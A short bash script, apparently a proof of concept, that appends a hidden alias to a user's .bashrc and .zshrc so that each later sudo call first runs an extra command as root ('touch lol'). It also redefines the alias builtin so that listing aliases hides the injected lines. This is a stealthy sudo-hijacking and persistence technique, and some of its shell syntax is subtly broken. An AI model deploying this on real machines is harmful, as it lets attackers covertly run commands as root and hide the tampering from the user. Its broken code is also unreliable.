#!/bin/bash

SUDO_ALIAS="\nalias sudo=\"sudo touch lol; sudo \`#h1dD3N\`\"\nfunction alias() { if [ \$# = 0 ]; then command alias | /bin/grep -v 'h1dD3N'; else command alias '\$1'; fi } #h1dD3N"

function install_in_rc() {
    if ! [ -f "$1" ]; then
        return
    fi
    if ! [ grep -q "h1dD3N" "$1" ]; then
        echo -e $SUDO_ALIAS >> "$1"
    fi
}

install_in_rc ~/.bashrc
install_in_rc ~/.zshrc
